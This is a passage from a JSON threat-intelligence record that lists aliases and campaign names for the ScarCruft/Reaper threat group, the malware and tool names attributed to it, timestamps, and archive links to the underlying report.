                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1694484397,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 0,
    "ts_modification_date": 0,
    "files": {
        "pdf": "https://archive.orkl.eu/4ea12d6ff75828a66b886906a8bc8196ed2a1fd3.pdf",
        "text": "https://archive.orkl.eu/4ea12d6ff75828a66b886906a8bc8196ed2a1fd3.txt",
        "img": "https://archive.orkl.eu/4ea12d6ff75828a66b886906a8bc8196ed2a1fd3.jpg"
    }
}